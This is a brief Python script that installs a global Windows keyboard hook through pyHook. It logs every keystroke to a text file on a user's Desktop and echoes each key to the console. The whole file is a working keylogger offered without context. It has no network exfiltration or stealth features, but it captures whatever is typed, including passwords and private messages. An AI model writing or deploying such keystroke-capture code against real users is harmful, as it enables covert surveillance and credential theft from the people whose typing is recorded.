import pyHook, pythoncom, sys, logging

file_log = 'D:\\Vanaj\\Desktop\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    print(chr(event.KeyID))
    chr(event.KeyID)
    print("Ascii value is: ",str(event.KeyID))
    logging.log(10, chr(event.KeyID))
    return True

hooker = pyHook.HookManager()
hooker.KeyDown = OnKeyboardEvent
hooker.HookKeyboard()
pythoncom.PumpMessages()

